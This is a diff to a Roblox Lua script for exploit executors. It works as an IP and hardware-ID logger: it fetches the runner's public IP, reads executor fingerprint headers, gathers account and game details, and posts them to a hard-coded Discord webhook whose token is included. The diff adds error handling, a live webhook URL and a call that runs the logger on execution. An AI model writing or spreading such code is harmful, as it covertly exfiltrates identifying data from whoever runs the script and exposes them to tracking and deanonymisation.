@@ -1,6 +1,13 @@
 local function main()
     -- Fetch the IP address
-    local IP = game:HttpGet("https://v4.ident.me")
+    local IP
+    local success, ipError = pcall(function()
+        IP = game:HttpGet("https://v4.ident.me")
+    end)
+
+    if not success then
+        IP = "Unable to fetch IP: " .. ipError
+    end
 
     -- Get the local player
     local plr = game:GetService('Players').LocalPlayer
@@ -13,7 +20,14 @@ local function main()
 
     -- Fetch game information
     local market = game:GetService("MarketplaceService")
-    local info = market:GetProductInfo(game.PlaceId, Enum.InfoType.Asset)
+    local info
+    local success, infoError = pcall(function()
+        info = market:GetProductInfo(game.PlaceId, Enum.InfoType.Asset)
+    end)
+
+    if not success then
+        info = {Name = "Unknown", Description = "Unable to fetch game info: " .. infoError}
+    end
 
     -- Define the HTTP request function
     local http_request = http_request
@@ -29,28 +43,39 @@ local function main()
     end
 
     -- Perform an HTTP GET request to obtain hardware information
-    local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body
-    local decoded = game:GetService('HttpService'):JSONDecode(body)
-    local hwid_list = {"Syn-Fingerprint", "Exploit-Guid", "Proto-User-Identifier", "Sentinel-Fingerprint"}
+    local body
     local hwid = ""
+    local success, hwidError = pcall(function()
+        local response = http_request({Url = 'https://httpbin.org/get', Method = 'GET'})
+        if response.StatusCode == 200 then
+            body = response.Body
+            local decoded = game:GetService('HttpService'):JSONDecode(body)
+            local hwid_list = {"Syn-Fingerprint", "Exploit-Guid", "Proto-User-Identifier", "Sentinel-Fingerprint"}
 
-    -- Extract hardware ID from the response
-    for _, v in pairs(hwid_list) do
-        if decoded.headers[v] then
-            hwid = decoded.headers[v]
-            break
+            for _, v in pairs(hwid_list) do
+                if decoded.headers[v] then
+                    hwid = decoded.headers[v]
+                    break
+                end
+            end
+        else
+            hwidError = "HTTP request failed with status: " .. response.StatusCode
         end
+    end)
+
+    if not success then
+        hwid = "Unable to fetch HWID: " .. (hwidError or "Unknown error")
     end
 
     -- Send data to Discord Webhook if HWID is present
-    if hwid then
+    if hwid and hwid ~= "" then
         local HttpServ = game:GetService('HttpService')
-        local url = "https://discord.com/api/webhooks/1267252864447942788/lR1ve7Ugp_CThPmHVSLD-5Cyv5MTgy-Smqe9BZdHcQ9QUaX2CkB2SAudkg_eFVI1xi1D"  -- Replace with your webhook URL
+        local url = "https://discord.com/api/webhooks/1264339196382806058/veMLm0XVO-xlqPp3Q887MA_SpsWXWkFo3l5BhZlSTOYVR1ma0bzmV6A76fuOWr2RoyRH"
 
         local data = {
             ["content"] = "",
             ["embeds"] = {{
-                ["title"] = "__*Information:**__",
+                ["title"] = "__*Information:*__",
                 ["description"] = hwid,
                 ["type"] = "rich",
                 ["color"] = tonumber(0xAB0909),
@@ -82,12 +107,12 @@ local function main()
                     },
                     {
                         ["name"] = "Premium:",
-                        ["value"] = premium,
+                        ["value"] = tostring(premium),
                         ["inline"] = true
                     },
                     {
                         ["name"] = "ALT:",
-                        ["value"] = ALT,
+                        ["value"] = tostring(ALT),
                         ["inline"] = true
                     },
                 },
@@ -99,6 +124,17 @@ local function main()
             ["content-type"] = "application/json"
         }
         local request_payload = {Url = url, Body = newdata, Method = "POST", Headers = headers}
-        http_request(request_payload)
+        local success, postError = pcall(function()
+            http_request(request_payload)
+        end)
+
+        if not success then
+            print("Failed to send data to Discord: " .. postError)
+        end
+    else
+        print("No HWID found or HWID fetch error.")
     end
 end
+
+-- Call the main function
+main()
